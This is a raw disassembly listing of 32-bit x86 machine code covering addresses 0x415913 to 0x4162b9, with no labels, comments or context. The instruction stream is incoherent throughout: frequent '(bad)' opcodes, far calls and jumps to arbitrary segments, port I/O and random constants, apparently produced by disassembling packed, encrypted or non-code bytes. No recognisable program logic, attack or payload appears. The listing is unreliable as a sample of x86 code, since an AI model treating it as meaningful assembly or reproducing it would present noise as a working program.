  415913:	in     eax,dx
  415914:	mov    ds:0x614f7281,eax
  415919:	ja     0x41596e
  41591b:	arpl   WORD PTR [esi],sp
  41591d:	sbb    dl,BYTE PTR [esi]
  41591f:	sub    ebx,DWORD PTR [edi-0x67ac2472]
  415925:	rcr    BYTE PTR [ebp-0x61fc2716],1
  41592b:	push   esp
  41592c:	call   0x5142:0xcba29f77
  415933:	jl     0x4159a2
  415935:	xor    ecx,DWORD PTR [ecx-0x297d95d8]
  41593b:	sbb    dl,cl
  41593d:	cmp    eax,0x79214fa5
  415942:	xor    ch,BYTE PTR [eax-0x6bf2731b]
  415948:	jecxz  0x4158d1
  41594a:	add    ebx,ebx
  41594c:	mov    ecx,0x7eedc699
  415951:	(bad)  
  415952:	jecxz  0x415957
  415954:	mov    edx,0xe3ab9dde
  415959:	(bad)  
  41595a:	or     ah,BYTE PTR [ecx]
  41595c:	(bad)
  41595f:	jp     0x4159a2
  415961:	mov    ebx,0x531f747b
  415966:	into   
  415967:	std    
  415968:	push   eax
  415969:	add    BYTE PTR [eax+ecx*2-0xcbcd0ec],bl
  415970:	sbb    al,0x21
  415972:	xor    ebx,ebx
  415974:	shr    esi,cl
  415976:	xor    al,0xfe
  415978:	es aas 
  41597a:	imul   eax,DWORD PTR [edx-0x681e6f69],0x52
  415981:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415982:	sti    
  415983:	dec    dl
  415985:	fstp   TBYTE PTR [ecx]
  415987:	sub    bh,BYTE PTR [ecx]
  415989:	inc    eax
  41598a:	fs ins DWORD PTR es:[edi],dx
  41598c:	cmp    bl,al
  41598e:	repz test DWORD PTR [edx],0x65045c5f
  415995:	aaa    
  415996:	cdq    
  415997:	mov    ds:0xa32ee979,al
  41599c:	(bad)  
  41599d:	mov    dl,0x67
  41599f:	jmp    0x4159c0
  4159a1:	dec    esi
  4159a2:	into   
  4159a3:	and    BYTE PTR [ecx+0x2f67a4c5],bh
  4159a9:	(bad)
  4159ad:	push   esp
  4159ae:	sbb    bl,0x2a
  4159b1:	jecxz  0x4159d2
  4159b3:	sbb    esi,DWORD PTR [ebx+0x67]
  4159b6:	sub    edi,DWORD PTR [esi-0x1f]
  4159b9:	mov    esi,0x966bdf3
  4159be:	mov    al,0xfb
  4159c0:	jge    0x41595b
  4159c2:	jge    0x4159eb
  4159c4:	xchg   ebx,eax
  4159c5:	sub    al,0x2a
  4159c7:	push   esi
  4159c8:	xor    BYTE PTR ds:0xcffc0b3c,0xda
  4159cf:	push   ds
  4159d0:	cmp    eax,0xa901a90d
	...
  415ba9:	xchg   BYTE PTR [eax-0x30],ah
  415bac:	dec    eax
  415bad:	idiv   al
  415baf:	sahf   
  415bb0:	out    dx,al
  415bb1:	or     eax,0x5db0d536
  415bb6:	nop
  415bb7:	in     eax,dx
  415bb8:	ins    BYTE PTR es:[edi],dx
  415bb9:	mov    ebx,0x20000168
  415bbe:	pop    es
  415bbf:	add    BYTE PTR [eax],al
  415bc1:	(bad)  
  415bc2:	(bad)  
  415bc3:	add    DWORD PTR [ebx],ebx
  415bc5:	xor    al,0x8f
  415bc7:	push   0xbf30a195
  415bcc:	clc    
  415bcd:	jl     0x415c37
  415bcf:	stos   DWORD PTR es:[edi],eax
  415bd0:	out    dx,al
  415bd1:	cmc    
  415bd2:	int3   
  415bd3:	inc    esi
  415bd4:	pop    esi
  415bd5:	push   0x65d7261e
  415bda:	repnz or eax,0x8cd5ae2
  415be0:	inc    edx
  415be1:	pop    ss
  415be2:	adc    bl,BYTE PTR ds:0xa5928be0
  415be8:	cwde   
  415be9:	push   esi
  415bea:	jle    0x415be0
  415bec:	inc    ebp
  415bed:	shl    BYTE PTR [esi+0x29],1
  415bf0:	mov    esi,0x114eb62e
  415bf5:	and    esi,DWORD PTR [eax]
  415bf7:	adc    DWORD PTR [ebx-0x51],ebp
  415bfa:	stos   DWORD PTR es:[edi],eax
  415bfb:	inc    esi
  415bfc:	adc    edx,DWORD PTR [ebp-0x5d]
  415bff:	pushf  
  415c00:	jns    0x415b9c
  415c02:	sbb    ebp,eax
  415c04:	sbb    al,0x86
  415c06:	or     ebx,ebx
  415c08:	mov    edi,0xf67c43c2
  415c0d:	cmp    BYTE PTR [ecx-0xc775831],bl
  415c13:	xchg   edx,eax
  415c14:	adc    esp,DWORD PTR [edi+0x1a]
  415c17:	or     DWORD PTR [ebx],esp
  415c19:	out    dx,eax
  415c1a:	mov    al,0x7f
  415c1c:	aam    0x87
  415c1e:	push   esi
  415c1f:	lods   eax,DWORD PTR ds:[esi]
  415c20:	mov    ds:0xf9587207,eax
  415c25:	mov    dl,0xcd
  415c27:	mov    ?,WORD PTR [esi+ecx*8-0x206ce2a1]
  415c2e:	int3   
  415c2f:	adc    al,BYTE PTR [edi-0x71]
  415c32:	(bad)  
  415c33:	pop    ecx
  415c34:	aad    0x63
  415c36:	mov    WORD PTR [edi-0x5e],?
  415c39:	sbb    DWORD PTR [ebp-0x1eb27545],ebx
  415c3f:	push   es
  415c40:	out    0x45,eax
  415c42:	fdivp  st(7),st
  415c44:	gs xchg ecx,eax
  415c46:	repz jbe 0x415cb8
  415c49:	lods   eax,DWORD PTR ds:[esi]
  415c4a:	in     eax,dx
  415c4b:	icebp  
  415c4c:	and    eax,0x6a90e933
  415c51:	xchg   edx,eax
  415c52:	loope  0x415bd7
  415c54:	sbb    edx,DWORD PTR ds:0x4ca62443
  415c5a:	xor    cl,BYTE PTR [ebx+0x57268b01]
  415c60:	out    dx,eax
  415c61:	(bad)  
  415c62:	sti    
  415c63:	test   eax,0x83c9e17e
  415c68:	out    0xa,al
  415c6a:	pop    es
  415c6b:	nop
  415c6c:	sub    BYTE PTR [edi],0x9a
  415c6f:	popa   
  415c70:	xchg   esp,eax
  415c71:	cmp    cl,BYTE PTR [edx+0x6601af36]
  415c77:	mov    ch,BYTE PTR [eax-0x44]
  415c7a:	test   eax,0x56973243
  415c7f:	or     bh,0xcf
  415c82:	test   BYTE PTR [ebp-0x73],cl
  415c85:	sbb    al,0x9f
  415c87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c88:	pop    es
  415c89:	(bad)  
  415c8a:	mov    edx,0x47db38c3
  415c8f:	shl    DWORD PTR ds:0x556dae90,0xff
  415c96:	rcl    BYTE PTR [ecx-0x4f],1
  415c99:	les    esp,FWORD PTR [edi+0x10]
  415c9c:	push   ecx
  415c9d:	cmp    eax,0x6c43bd27
  415ca2:	mov    ebx,0x9f0e13ca
  415ca7:	daa    
  415ca8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ca9:	aas    
  415caa:	fdiv   QWORD PTR ds:0xad45e9dc
  415cb0:	fldcw  WORD PTR [ebx-0x4c1c3ad5]
  415cb6:	jle    0x415c4f
  415cb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cb9:	or     ebp,ebp
  415cbb:	pop    edx
  415cbc:	out    0xa9,al
  415cbe:	sbb    al,BYTE PTR [ebx+esi*2]
  415cc1:	sar    BYTE PTR [eax],cl
  415cc3:	add    esi,esp
  415cc5:	nop
  415cc6:	add    al,BYTE PTR [ecx-0x100049d]
  415ccc:	pop    ss
  415ccd:	cmp    dh,BYTE PTR [ecx+0x48]
  415cd0:	jns    0x415d24
  415cd2:	adc    ebx,DWORD PTR [edx]
  415cd4:	sbb    eax,0x6b5e5efb
  415cd9:	pop    esi
  415cda:	retf   
  415cdb:	pop    edi
  415cdc:	mov    esp,0x9a2b80a7
  415ce1:	call   0x65e6:0x1921cba7
  415ce8:	push   ss
  415ce9:	add    BYTE PTR [esi],al
  415ceb:	pop    edi
  415cec:	adc    BYTE PTR fs:[ecx],ch
  415cef:	dec    edx
  415cf0:	pop    ss
  415cf1:	and    DWORD PTR [ebx+0x65],ebp
  415cf4:	sbb    ebx,DWORD PTR [eax+0x47]
  415cf7:	add    esi,DWORD PTR [edi-0x1d394559]
  415cfd:	into   
  415cfe:	inc    eax
  415cff:	retf   0xe3f
  415d02:	jo     0x415cd2
  415d04:	stos   BYTE PTR es:[edi],al
  415d05:	aas    
  415d06:	out    dx,al
  415d07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d08:	mov    dl,0x1f
  415d0a:	int    0x4d
  415d0c:	mov    eax,ds:0xcf9123f9
  415d11:	lds    ebx,FWORD PTR [edx-0x6b]
  415d14:	mov    BYTE PTR [ecx-0x50],bl
  415d17:	loope  0x415d17
  415d19:	test   al,0xc9
  415d1b:	jg     0x415ca4
  415d1d:	mov    ecx,0xf9209f20
  415d22:	(bad)  
  415d23:	scas   al,BYTE PTR es:[edi]
  415d24:	repz out 0xb9,al
  415d27:	ficom  DWORD PTR [ecx+0x72128cb7]
  415d2d:	pop    es
  415d2e:	fstp   TBYTE PTR [eax+0x778f4ec6]
  415d34:	call   0xdbe3:0xf0fba414
  415d3b:	push   0xffffff99
  415d3d:	ficomp DWORD PTR [eax-0x2c2bea36]
  415d43:	clc    
  415d44:	mov    al,0x83
  415d46:	and    al,0x71
  415d48:	cmp    eax,0x832d6500
  415d4d:	rcl    DWORD PTR [eax+0x5d24e2d6],cl
  415d53:	das    
  415d54:	and    BYTE PTR [ebx-0xe],0xcb
  415d58:	add    dl,BYTE PTR [ebx]
  415d5a:	or     DWORD PTR [eax-0x68f1b4f1],ebp
  415d60:	outs   dx,DWORD PTR ds:[esi]
  415d61:	mov    esp,0x98a6ea3a
  415d66:	psubd  mm1,QWORD PTR [edx+ebx*4-0x62337821]
  415d6e:	pop    esi
  415d6f:	sbb    al,0x1
  415d71:	mov    ebx,0xd7fbcb64
  415d76:	stos   BYTE PTR es:[edi],al
  415d77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d78:	xor    eax,0xdbd73843
  415d7d:	mov    edx,0x8c737fa1
  415d82:	ja     0x415d4d
  415d84:	dec    ebp
  415d85:	push   eax
  415d86:	ror    BYTE PTR [edx-0x482fed4c],1
  415d8c:	test   DWORD PTR ds:0x250821fb,eax
  415d92:	and    al,0xc9
  415d94:	lds    ecx,FWORD PTR [edx-0x4453cf31]
  415d9a:	(bad)  
  415d9b:	cmp    BYTE PTR [eax+0x4e],al
  415d9e:	mov    cl,0x9f
  415da0:	pop    edi
  415da1:	imul   edi,DWORD PTR [edi+eiz*8]
  415da5:	(bad)  
  415da6:	aad    0x9
  415da8:	or     BYTE PTR ds:0x7536165c,ah
  415dae:	jns    0x415dcc
  415db0:	std    
  415db1:	js     0x415d88
  415db3:	int3   
  415db4:	shl    al,cl
  415db6:	mov    ds:0xa6d52148,al
  415dbb:	test   eax,0x3f9947fa
  415dc0:	addr16 (bad) 
  415dc2:	in     al,0x26
  415dc4:	mov    ah,al
  415dc6:	les    esi,FWORD PTR [eax]
  415dc8:	mov    esi,?
  415dca:	test   ebx,esp
  415dcc:	pop    ecx
  415dcd:	or     esp,DWORD PTR [ebp+0xa]
  415dd0:	mov    ebx,0x7ec9b496
  415dd5:	xchg   DWORD PTR [eax-0x2f],esp
  415dd8:	adc    ebx,DWORD PTR [ebx+ecx*1+0x4c]
  415ddc:	jmp    0xdcb7a6a1
  415de1:	add    eax,0x983badbe
  415de6:	in     eax,0xca
  415de8:	jle    0x415dfd
  415dea:	leave  
  415deb:	lods   al,BYTE PTR ds:[esi]
  415dec:	ins    DWORD PTR es:[edi],dx
  415ded:	lahf   
  415dee:	enter  0x3138,0x5f
  415df2:	or     al,0x2e
  415df4:	mov    edx,0x2bbd1742
  415df9:	jns    0x415dbe
  415dfb:	xor    eax,esp
  415dfd:	cmp    DWORD PTR [ebx+edx*8],edx
  415e00:	push   0xffffffb1
  415e02:	out    0x0,al
  415e04:	cs or  al,0x7
  415e07:	les    esi,FWORD PTR [edx-0x4d8efaa8]
  415e0d:	icebp  
  415e0e:	and    BYTE PTR [ebx-0x4b45e7fe],ch
  415e14:	scas   al,BYTE PTR es:[edi]
  415e15:	les    ecx,FWORD PTR [eax]
  415e17:	push   es
  415e18:	push   0xfffffffc
  415e1a:	call   0xc1ff:0xd430
  415e20:	sti    
  415e21:	xor    bl,al
  415e23:	ret    0xa284
  415e26:	gs sahf 
  415e28:	scas   eax,DWORD PTR es:[edi]
  415e29:	mov    eax,0x18ec5586
  415e2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e2f:	inc    edx
  415e30:	mov    ah,0xb9
  415e32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e33:	mov    DWORD PTR [esi+ebp*8+0x64d0095],edx
  415e3a:	shl    BYTE PTR [ebx],cl
  415e3c:	stc    
  415e3d:	add    al,BYTE PTR [ebp-0x11]
  415e40:	push   eax
  415e41:	ror    BYTE PTR [ebx-0x6f1a0390],0x41
  415e48:	or     bh,cl
  415e4a:	xchg   ebx,eax
  415e4b:	push   esp
  415e4c:	push   eax
  415e4d:	pop    esi
  415e4e:	fisubr WORD PTR [esi+0x23]
  415e51:	and    DWORD PTR [edx+0x77dd6072],edi
  415e57:	push   eax
  415e58:	in     al,0xd0
  415e5a:	in     al,dx
  415e5b:	div    DWORD PTR [esi-0x337994d5]
  415e61:	int    0x4c
  415e63:	dec    ecx
  415e64:	leave  
  415e65:	repz es pop edi
  415e68:	jmp    0x415e60
  415e6a:	stos   BYTE PTR es:[edi],al
  415e6b:	iret   
  415e6c:	xchg   ecx,eax
  415e6d:	sbb    DWORD PTR [esp-0x7c],edi
  415e71:	cmp    al,0xef
  415e73:	or     cl,BYTE PTR [edi]
  415e75:	(bad)  
  415e76:	fstp   DWORD PTR [ebx]
  415e78:	in     al,dx
  415e79:	dec    eax
  415e7a:	ret    0xa2ed
  415e7d:	jns    0x415e7d
  415e7f:	inc    ebx
  415e80:	daa    
  415e81:	inc    ecx
  415e82:	sbb    al,0x0
  415e84:	dec    edi
  415e85:	bound  ebx,QWORD PTR [ebx+ecx*2]
  415e88:	mov    ds:0x528a6190,eax
  415e8d:	test   al,0x4
  415e8f:	sbb    eax,0x4698b025
  415e94:	out    0x8a,eax
  415e96:	lea    edi,[edx+0x332fd849]
  415e9c:	pmulhuw mm3,QWORD PTR [ebp+0x68]
  415ea0:	aaa    
  415ea1:	adc    BYTE PTR [esi-0x79d5849b],0xd1
  415ea8:	sbb    eax,0x1766673f
  415ead:	add    ah,dl
  415eaf:	pop    ebx
  415eb0:	stos   DWORD PTR es:[edi],eax
  415eb1:	inc    ebx
  415eb2:	lahf   
  415eb3:	fcom   QWORD PTR [ebx+0x66050e0f]
  415eb9:	push   ss
  415eba:	xchg   BYTE PTR [edx+0x2106f540],dl
  415ec0:	call   0x97102a7
  415ec5:	push   0x1e
  415ec7:	sbb    DWORD PTR [ebx+0x23862f03],edx
  415ecd:	(bad)  
  415ece:	iret   
  415ecf:	and    dl,BYTE PTR ds:0x5dfeef37
  415ed5:	cmp    BYTE PTR [ebp-0xc86cbc0],0xea
  415edc:	or     al,0xac
  415ede:	mov    ah,0x62
  415ee0:	in     al,0x2b
  415ee2:	popf   
  415ee3:	pushf  
  415ee4:	pushf  
  415ee5:	add    al,0xb4
  415ee7:	push   edx
  415ee8:	jno    0x415ec4
  415eea:	inc    edi
  415eeb:	scas   al,BYTE PTR es:[edi]
  415eec:	mov    esp,0x4a848f57
  415ef1:	push   esi
  415ef2:	jmp    0xc5b9:0x5c4a7023
  415ef9:	lods   eax,DWORD PTR ds:[esi]
  415efa:	inc    ebp
  415efb:	push   es
  415efc:	mov    edi,0xf311e331
  415f01:	pop    ebx
  415f02:	fistp  WORD PTR [edi+0x625d3ac9]
  415f08:	inc    eax
  415f09:	sbb    BYTE PTR [eax-0x32],al
  415f0c:	xchg   DWORD PTR [ebp-0x156d7c8],eax
  415f12:	cdq    
  415f13:	jns    0x415eac
  415f15:	fidiv  WORD PTR [ecx-0x2f]
  415f18:	leave  
  415f19:	dec    edx
  415f1a:	inc    eax
  415f1b:	fdivr  QWORD PTR [ebx+eiz*1-0x43]
  415f1f:	push   ss
  415f20:	stc    
  415f21:	push   0x1b
  415f23:	shl    DWORD PTR [edx+0x4a],0x9a
  415f27:	adc    DWORD PTR ds:0x93d34aeb,ebp
  415f2d:	jmp    0xff91292a
  415f32:	adc    ch,BYTE PTR [ecx]
  415f34:	pop    edx
  415f35:	dec    edx
  415f36:	scas   eax,DWORD PTR es:[edi]
  415f37:	add    BYTE PTR [edx],ch
  415f39:	aas    
  415f3a:	leave  
  415f3b:	fsubp  st(7),st
  415f3d:	cld    
  415f3e:	(bad)  
  415f40:	add    eax,DWORD PTR [eax-0x5d]
  415f43:	xor    al,0x27
  415f45:	xchg   esp,eax
  415f46:	dec    ebp
  415f47:	dec    ebp
  415f48:	dec    edi
  415f49:	mov    ch,0x30
  415f4b:	add    eax,0xb2879620
  415f50:	jo     0x415f62
  415f52:	lods   al,BYTE PTR ds:[esi]
  415f53:	push   ecx
  415f54:	inc    edi
  415f55:	ret    0x2b71
  415f58:	push   esi
  415f59:	rcl    DWORD PTR [edi-0x6f4279ca],cl
  415f5f:	clc    
  415f60:	gs push es
  415f62:	in     eax,0xff
  415f64:	sbb    dh,BYTE PTR [ebx-0x59]
  415f67:	test   eax,0x80099dd4
  415f6c:	or     al,0x9e
  415f6e:	pop    ebp
  415f6f:	and    cl,BYTE PTR [ebp+0xe]
  415f72:	js     0x415f29
  415f74:	mov    edi,eax
  415f76:	into   
  415f77:	scas   eax,DWORD PTR es:[edi]
  415f78:	clc    
  415f79:	dec    eax
  415f7a:	jb     0x415f99
  415f7c:	data16 gs loop 0x415fd5
  415f80:	dec    ebp
  415f81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f82:	and    edi,DWORD PTR [esi]
  415f84:	jae    0x415fae
  415f86:	ins    DWORD PTR es:[edi],dx
  415f87:	inc    ecx
  415f88:	and    cl,BYTE PTR [ecx+0x2e]
  415f8b:	out    dx,eax
  415f8c:	aam    0x39
  415f8e:	mov    ds:0xb4d2aa03,al
  415f93:	xchg   edx,eax
  415f94:	mov    ah,0x5
  415f96:	or     edx,0x42
  415f99:	leave  
  415f9a:	jmp    0x90f789ab
  415f9f:	mov    esi,0x6e9240f4
  415fa4:	ss jno 0x415f6b
  415fa7:	push   edi
  415fa8:	leave  
  415fa9:	fld    DWORD PTR ss:[esi-0x74]
  415fad:	add    al,0xa7
  415faf:	adc    DWORD PTR [edi+0x7c00dc69],esi
  415fb5:	call   0xeaa7:0x18e13f22
  415fbc:	or     dh,cl
  415fbe:	adc    al,0xfd
  415fc0:	loopne 0x415f62
  415fc2:	dec    esp
  415fc3:	xchg   ecx,eax
  415fc4:	or     al,0xc1
  415fc6:	ins    BYTE PTR es:[edi],dx
  415fc7:	adc    BYTE PTR [eax*2+0x509db9d8],0x3
  415fcf:	(bad)  
  415fd0:	jns    0x415fc4
  415fd2:	or     bh,bl
  415fd4:	dec    BYTE PTR [ecx+ebx*2+0xa]
  415fd8:	xor    DWORD PTR [edx],esi
  415fda:	jno    0x41604a
  415fdc:	test   al,0x66
  415fde:	inc    edi
  415fdf:	popa   
  415fe0:	in     al,0xa0
  415fe2:	mov    bh,0x17
  415fe4:	ret    0xfb64
  415fe7:	xchg   ebx,eax
  415fe8:	xor    DWORD PTR [ebx+ebp*2],eax
  415feb:	bound  esp,QWORD PTR [ebx-0x3]
  415fee:	popf   
  415fef:	cmp    al,0xa0
  415ff1:	test   al,0xb0
  415ff3:	fwait
  415ff4:	and    DWORD PTR [ebx],ecx
  415ff6:	ds pop esi
  415ff8:	adc    esi,DWORD PTR [ebx+0x5a9f2a43]
  415ffe:	mov    bh,0x24
  416000:	(bad)  
  416001:	cli    
  416002:	out    dx,eax
  416003:	(bad)  
  416004:	mov    ch,0xa3
  416006:	mov    esp,0x26e959c8
  41600b:	cmp    esi,ebx
  41600d:	and    DWORD PTR [ecx-0x2fd2f30],edx
  416013:	xchg   edi,eax
  416014:	jno    0x415fad
  416016:	leave  
  416017:	popa   
  416018:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416019:	push   ss
  41601a:	loopne 0x41603a
  41601c:	add    al,0x42
  41601e:	pop    ss
  41601f:	loope  0x415fd7
  416021:	in     al,dx
  416022:	push   edi
  416023:	dec    esi
  416024:	repnz pop esi
  416026:	add    eax,0x28d5322
  41602b:	cwde   
  41602c:	mov    dh,0x10
  41602e:	jecxz  0x416074
  416030:	in     al,0x53
  416032:	cmp    esp,DWORD PTR [ebx+0xd]
  416035:	cmc    
  416036:	jb     0x41608b
  416038:	mov    dh,0x1a
  41603a:	adc    eax,0x9009cedb
  41603f:	or     BYTE PTR [edi-0x6b],0x72
  416043:	test   BYTE PTR [ebx-0x2e0918af],0xbf
  41604a:	cs stos BYTE PTR es:[edi],al
  41604c:	mov    ebp,0xd06e1815
  416051:	or     edi,ebp
  416053:	mov    esi,0x5ded9c5a
  416058:	jbe    0x416005
  41605a:	sbb    DWORD PTR gs:[edx+0x2a],ebx
  41605e:	arpl   WORD PTR [eax-0x68],ax
  416061:	sub    esp,DWORD PTR [eax-0x7e]
  416064:	push   edi
  416065:	js     0x4160e0
  416067:	mov    ss,WORD PTR [ebx+0x52ebf170]
  41606d:	pop    es
  41606e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41606f:	jmp    FWORD PTR [edx]
  416071:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416073:	jns    0x4160ca
  416075:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416076:	and    al,0x2f
  416078:	jmp    0x9528:0xd2a7e62d
  41607f:	sar    DWORD PTR [ebp+0x53],1
  416082:	test   BYTE PTR [ebp+0x70f4a43a],al
  416088:	jmp    0x416105
  41608a:	out    0xc0,al
  41608c:	jmp    FWORD PTR [esi+0x52e00dec]
  416092:	aaa    
  416093:	dec    ebx
  416094:	ins    DWORD PTR es:[edi],dx
  416095:	stc    
  416096:	lea    ebx,[edx-0x72]
  416099:	imul   esi,DWORD PTR [ebx+ebp*8-0x2870164c],0x48
  4160a1:	adc    bh,BYTE PTR [ebx-0x2edca1b7]
  4160a7:	sub    ah,BYTE PTR [edi-0xe989299]
  4160ad:	fcom   DWORD PTR [eax-0x2acc5917]
  4160b3:	cli    
  4160b4:	inc    ebp
  4160b5:	cmc    
  4160b6:	add    edx,esp
  4160b8:	lods   al,BYTE PTR ds:[esi]
  4160b9:	ficomp DWORD PTR [ecx]
  4160bb:	retf   0x3cd3
  4160be:	jnp    0x4160bd
  4160c0:	jae    0x41613e
  4160c2:	and    dl,BYTE PTR [edx]
  4160c4:	and    DWORD PTR [ebp-0x7b],eax
  4160c7:	dec    DWORD PTR [edi-0x7]
  4160ca:	add    cl,BYTE PTR [eax-0x757dd876]
  4160d0:	fmul   st,st(4)
  4160d2:	stc    
  4160d3:	lahf   
  4160d4:	or     bl,bh
  4160d6:	sub    bh,dl
  4160d8:	add    DWORD PTR [edx-0x23b29ca9],edi
  4160de:	push   es
  4160df:	mov    ds:0xe0685341,eax
  4160e4:	dec    esi
  4160e5:	dec    ecx
  4160e6:	les    esp,FWORD PTR [ecx+0x458071bc]
  4160ec:	out    dx,eax
  4160ed:	loopne 0x41609e
  4160ef:	es lock cmp al,0x1e
  4160f3:	pop    edi
  4160f4:	test   eax,0xce453c06
  4160f9:	sub    al,0x62
  4160fb:	(bad)  
  4160fc:	cs clc 
  4160fe:	sub    eax,0x4baf681c
  416103:	xchg   DWORD PTR [eax+0x44c28508],esi
  416109:	cmp    al,0x8c
  41610b:	sti    
  41610c:	push   es
  41610d:	je     0x416175
  41610f:	out    0x24,eax
  416111:	sbb    al,0xaf
  416113:	mov    edx,0xe9d26f81
  416118:	bnd ja 0x4160da
  41611b:	add    DWORD PTR [edx+0x6d694530],edx
  416121:	sub    ah,dh
  416123:	lahf   
  416124:	jb     0x416172
  416126:	lahf   
  416127:	sub    eax,0x7651a5cc
  41612c:	stos   BYTE PTR es:[edi],al
  41612d:	add    DWORD PTR [eax+eiz*1+0x18cfdfc5],0x1d
  416135:	or     DWORD PTR [ecx+eiz*8],edi
  416138:	sbb    cl,bl
  41613a:	jl     0x4160d5
  41613c:	cmp    eax,edi
  41613e:	mov    ebp,0x31470a21
  416143:	dec    ecx
  416144:	(bad)  
  416145:	and    eax,0xfe5723e3
  41614a:	jle    0x416173
  41614c:	leave  
  41614d:	xor    al,0xb5
  41614f:	stc    
  416150:	xchg   DWORD PTR [edx+0x35],eax
  416153:	cli    
  416154:	add    edx,DWORD PTR [ebx-0x3ab92717]
  41615a:	jg     0x416152
  41615c:	neg    BYTE PTR [ebp+0x5fcb739d]
  416162:	xor    DWORD PTR [ecx+0x7d],esi
  416165:	sub    dl,BYTE PTR [ebx]
  416167:	pop    ebp
  416168:	xchg   ebp,eax
  416169:	sahf   
  41616a:	test   al,0x98
  41616c:	lds    eax,FWORD PTR [ebp-0x158034c]
  416172:	not    DWORD PTR [esi]
  416174:	ret    0x10bd
  416177:	pop    es
  416178:	sbb    eax,0xf661a074
  41617d:	cdq    
  41617e:	add    eax,0x2a7da743
  416183:	lods   al,BYTE PTR ds:[esi]
  416184:	push   edx
  416185:	sub    bh,BYTE PTR [edi-0x6c]
  416188:	xor    bh,BYTE PTR [ecx]
  41618a:	xchg   esi,eax
  41618b:	clc    
  41618c:	les    esp,FWORD PTR [edi-0x33309ef5]
  416192:	ins    BYTE PTR es:[edi],dx
  416193:	enter  0x1617,0xa7
  416197:	outs   dx,DWORD PTR ds:[esi]
  416198:	inc    esi
  416199:	fld    QWORD PTR [ecx+ebx*2]
  41619c:	push   es
  41619d:	ins    DWORD PTR es:[edi],dx
  41619e:	or     al,BYTE PTR [edi+0x59aba777]
  4161a4:	sahf   
  4161a5:	(bad)  
  4161a6:	retf   0xc1bf
  4161a9:	xchg   edi,eax
  4161aa:	jmp    0xad00f363
  4161af:	mov    ecx,0xc86a39ec
  4161b4:	cmp    eax,0x8b8b947b
  4161b9:	push   ss
  4161ba:	into   
  4161bb:	xor    BYTE PTR [esi+0x5f],dh
  4161be:	fcomp  DWORD PTR [ecx+0x2f]
  4161c1:	mov    ecx,0x999c3936
  4161c6:	retf   0x4869
  4161c9:	and    DWORD PTR [ebx+0x7d],ecx
  4161cc:	sbb    esp,esi
  4161ce:	or     al,0xf2
  4161d0:	shr    BYTE PTR [ecx+eax*8+0x2abcb135],1
  4161d7:	lea    edi,[ebp+0x3a]
  4161da:	cli    
  4161db:	inc    ecx
  4161dc:	adc    edi,DWORD PTR [esi+0x5a]
  4161df:	xchg   edi,eax
  4161e0:	aaa    
  4161e1:	adc    ch,BYTE PTR [edx+0x71]
  4161e4:	xchg   edi,eax
  4161e5:	push   ds
  4161e6:	xor    bl,0x26
  4161e9:	into   
  4161ea:	int3   
  4161eb:	push   ebx
  4161ec:	aam    0x7c
  4161ee:	les    esp,FWORD PTR [edx]
  4161f0:	or     ah,BYTE PTR [edi-0x37]
  4161f3:	inc    eax
  4161f4:	test   BYTE PTR [esi-0x39f03cbf],ch
  4161fa:	(bad)  [eax+0x2e752b9a]
  416200:	repnz cmp bh,0x47
  416204:	(bad)  
  416205:	dec    ebx
  416206:	and    eax,0x3a283d9f
  41620b:	fnstcw WORD PTR [ecx]
  41620d:	je     0x41619e
  41620f:	mov    esp,0xd0c5f551
  416214:	sbb    DWORD PTR [edx],0x9
  416217:	scas   eax,DWORD PTR es:[edi]
  416218:	ins    BYTE PTR es:[edi],dx
  416219:	push   edx
  41621a:	adc    eax,0xb9fed933
  41621f:	or     DWORD PTR [edi],0x9756dd3f
  416225:	repz or esp,DWORD PTR [eax-0x3c302e61]
  41622c:	and    al,0x99
  41622e:	push   eax
  41622f:	sub    eax,0xa5968813
  416234:	das    
  416235:	(bad)  
  416237:	enter  0x771b,0x11
  41623b:	sbb    DWORD PTR [edi],edx
  41623d:	push   ebx
  41623e:	and    eax,0x3779fc03
  416243:	xor    al,0x9f
  416245:	xchg   ecx,eax
  416246:	dec    ebp
  416247:	shl    DWORD PTR [ebx+ecx*8],1
  41624a:	out    dx,eax
  41624b:	loopne 0x41625e
  41624d:	outs   dx,BYTE PTR ds:[esi]
  41624e:	shl    DWORD PTR [esi+0x14fd4d5a],0x74
  416255:	fs in  al,0x3d
  416258:	clc    
  416259:	adc    eax,0x457e10a8
  41625e:	lods   al,BYTE PTR ds:[esi]
  41625f:	into   
  416260:	rol    DWORD PTR [ebp+0x2e],cl
  416263:	data16 (bad) 
  416265:	stc    
  416266:	push   ds
  416267:	pop    es
  416268:	iret   
  416269:	daa    
  41626a:	xlat   BYTE PTR ds:[ebx]
  41626b:	xor    al,0xa1
  41626d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41626e:	push   cs
  41626f:	jmp    0x41629c
  416271:	xchg   ebp,eax
  416272:	ja     0x416243
  416274:	jecxz  0x41629e
  416276:	lds    ecx,FWORD PTR [bp+di]
  416279:	or     ah,0xe6
  41627c:	or     al,0x19
  41627e:	imul   DWORD PTR [ebp-0x28]
  416281:	or     BYTE PTR [ebx-0x41],dh
  416284:	mov    dl,0xc5
  416286:	fisub  DWORD PTR [edx]
  416288:	sub    al,0xff
  41628a:	mov    edi,0x364ff062
  41628f:	mov    esp,0xb71a42c3
  416294:	ficom  DWORD PTR [esi+0x68]
  416297:	scas   al,BYTE PTR es:[edi]
  416298:	or     eax,0x709fa80a
  41629d:	call   0x7d95:0x3c8f2b3
  4162a4:	dec    edx
  4162a5:	je     0x4162b6
  4162a7:	push   0x6b
  4162a9:	shr    BYTE PTR [ecx+ecx*1],cl
  4162ac:	sar    ebp,1
  4162ae:	popa   
  4162af:	test   DWORD PTR [edx+eax*1-0x487bf7c1],ecx
  4162b6:	mov    al,0xb2
  4162b8:	leave  
  4162b9:	pop    ebx
